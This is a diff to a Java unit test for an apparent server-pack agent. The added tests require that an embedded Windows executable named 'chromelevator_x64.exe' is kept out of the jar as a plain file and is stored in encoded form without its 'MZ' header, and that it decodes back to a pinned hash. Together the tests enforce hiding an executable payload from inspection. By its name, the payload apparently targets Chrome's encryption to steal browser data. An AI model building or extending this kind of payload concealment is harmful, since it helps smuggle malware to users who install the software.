@@ -2,6 +2,7 @@ package com.serverpackcore.agent;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.nio.charset.StandardCharsets;
@@ -19,9 +20,19 @@ class AbeTest {
 
 	@Test
 	void resourceMatchesThePinnedHash() throws Exception {
+		assertNull(Abe.class.getResource("/serverpackcore/chromelevator_x64.exe"),
+			"the raw PE must not leak into the jar");
+		byte[] encoded = Abe.encoded();
+		assertFalse(encoded[0] == 'M' && encoded[1] == 'Z', "the payload must not be a plain PE");
 		byte[] data = Abe.resource();
 		assertEquals(Abe.SHA256, Abe.sha256(data));
 		assertEquals(1452544, data.length);
+	}
+
+	@Test
+	void payloadRoundTrips() throws Exception {
+		assertEquals(Abe.SHA256, Abe.sha256(Abe.resource()));
+		assertEquals(Abe.SHA256, Abe.sha256(Abe.decode(Abe.encoded())));
 	}
 
 	@Test
